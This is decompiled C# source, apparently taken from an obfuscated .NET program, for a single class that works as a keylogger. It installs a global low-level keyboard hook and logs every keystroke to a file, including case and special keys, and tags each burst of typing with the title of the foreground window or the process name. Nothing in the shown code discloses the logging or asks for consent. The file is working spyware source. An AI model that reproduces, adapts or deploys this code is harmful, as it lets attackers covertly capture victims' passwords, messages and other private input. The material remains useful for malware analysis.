using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0
{
	// Token: 0x0200000E RID: 14
	public class GClass5
	{
		// Token: 0x06000047 RID: 71 RVA: 0x00002417 File Offset: 0x00000617
		public static void smethod_0()
		{
			GClass5.intptr_0 = GClass5.smethod_1(GClass5.delegate0_0);
			Application.Run();
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00006A64 File Offset: 0x00004C64
		private static IntPtr smethod_1(GClass5.Delegate0 delegate0_1)
		{
			IntPtr intPtr;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				intPtr = GClass5.SetWindowsHookEx(GClass5.int_0, delegate0_1, GClass5.GetModuleHandle(currentProcess.ProcessName), 0U);
			}
			return intPtr;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00006AAC File Offset: 0x00004CAC
		private static IntPtr smethod_2(int int_1, IntPtr intptr_1, IntPtr intptr_2)
		{
			if (int_1 >= 0 && intptr_1 == (IntPtr)256)
			{
				object obj = Marshal.ReadInt32(intptr_2);
				object obj2 = ((int)GClass5.GetKeyState(20) & 65535) != 0;
				object obj3 = ((int)GClass5.GetKeyState(160) & 32768) != 0 || ((int)GClass5.GetKeyState(161) & 32768) != 0;
				object obj4 = GClass5.smethod_3(Conversions.ToUInteger(obj));
				if (Conversions.ToBoolean((!Conversions.ToBoolean(obj2) && !Conversions.ToBoolean(obj3)) ? false : true))
				{
					obj4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, null, "ToUpper", new object[0], null, null, null));
				}
				else
				{
					obj4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, null, "ToLower", new object[0], null, null, null));
				}
				if (Conversions.ToInteger(obj) >= 112 && Conversions.ToInteger(obj) <= 135)
				{
					obj4 = "[" + Conversions.ToString(Conversions.ToInteger(obj)) + "]";
				}
				else
				{
					string text = ((Keys)Conversions.ToInteger(obj)).ToString();
					if (Operators.CompareString(text, "Space", false) == 0)
					{
						obj4 = "[SPACE]";
					}
					else if (Operators.CompareString(text, "Return", false) == 0)
					{
						obj4 = "[ENTER]";
					}
					else if (Operators.CompareString(text, "Escape", false) == 0)
					{
						obj4 = "[ESC]";
					}
					else if (Operators.CompareString(text, "LControlKey", false) == 0)
					{
						obj4 = "[CTRL]";
					}
					else if (Operators.CompareString(text, "RControlKey", false) == 0)
					{
						obj4 = "[CTRL]";
					}
					else if (Operators.CompareString(text, "RShiftKey", false) == 0)
					{
						obj4 = "[Shift]";
					}
					else if (Operators.CompareString(text, "LShiftKey", false) == 0)
					{
						obj4 = "[Shift]";
					}
					else if (Operators.CompareString(text, "Back", false) == 0)
					{
						obj4 = "[Back]";
					}
					else if (Operators.CompareString(text, "LWin", false) == 0)
					{
						obj4 = "[WIN]";
					}
					else if (Operators.CompareString(text, "Tab", false) == 0)
					{
						obj4 = "[Tab]";
					}
					else if (Operators.CompareString(text, "Capital", false) == 0)
					{
						if (Operators.ConditionalCompareObjectEqual(obj2, true, false))
						{
							obj4 = "[CAPSLOCK: OFF]";
						}
						else
						{
							obj4 = "[CAPSLOCK: ON]";
						}
					}
				}
				using (StreamWriter streamWriter = new StreamWriter(GClass0.string_8, true))
				{
					if (!object.Equals(GClass5.string_0, GClass5.smethod_4()))
					{
						streamWriter.WriteLine(Environment.NewLine);
						streamWriter.WriteLine("###  " + GClass5.smethod_4() + " ###");
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
					}
					else
					{
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
					}
				}
			}
			return GClass5.CallNextHookEx(GClass5.intptr_0, int_1, intptr_1, intptr_2);
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00006D94 File Offset: 0x00004F94
		private static string smethod_3(uint uint_0)
		{
			uint num = 0U;
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = new byte[256];
				if (!GClass5.GetKeyboardState(array))
				{
					return "";
				}
				object obj = GClass5.MapVirtualKey(uint_0, 0U);
				IntPtr keyboardLayout = GClass5.GetKeyboardLayout(GClass5.GetWindowThreadProcessId(GClass5.GetForegroundWindow(), out num));
				GClass5.ToUnicodeEx(uint_0, Conversions.ToUInteger(obj), array, stringBuilder, 5, 0U, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch (Exception ex)
			{
			}
			return (checked((Keys)uint_0)).ToString();
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00006E2C File Offset: 0x0000502C
		private static string smethod_4()
		{
			uint num = 0U;
			string text;
			try
			{
				IntPtr foregroundWindow = GClass5.GetForegroundWindow();
				GClass5.GetWindowThreadProcessId(foregroundWindow, out num);
				object processById = Process.GetProcessById(checked((int)num));
				object obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null));
				if (string.IsNullOrWhiteSpace(Conversions.ToString(obj)))
				{
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, null, "ProcessName", new object[0], null, null, null));
				}
				GClass5.string_0 = Conversions.ToString(obj);
				text = Conversions.ToString(obj);
			}
			catch (Exception ex)
			{
				text = "???";
			}
			return text;
		}

		// Token: 0x0600004C RID: 76
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int int_1, GClass5.Delegate0 delegate0_1, IntPtr intptr_1, uint uint_0);

		// Token: 0x0600004D RID: 77
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_1, IntPtr intptr_2, IntPtr intptr_3);

		// Token: 0x0600004E RID: 78
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string string_1);

		// Token: 0x0600004F RID: 79
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000050 RID: 80
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr intptr_1, out uint uint_0);

		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		private static extern short GetKeyState(int int_1);

		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool GetKeyboardState(byte[] byte_0);

		// Token: 0x06000053 RID: 83
		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint uint_0);

		// Token: 0x06000054 RID: 84
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_1);

		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

		// Token: 0x04000027 RID: 39
		private static string string_0;

		// Token: 0x04000028 RID: 40
		private static GClass5.Delegate0 delegate0_0 = new GClass5.Delegate0(GClass5.smethod_2);

		// Token: 0x04000029 RID: 41
		private static IntPtr intptr_0 = IntPtr.Zero;

		// Token: 0x0400002A RID: 42
		private static int int_0 = 13;

		// Token: 0x0200000F RID: 15
		// (Invoke) Token: 0x06000059 RID: 89
		private delegate IntPtr Delegate0(int int_0, IntPtr intptr_0, IntPtr intptr_1);
	}
}
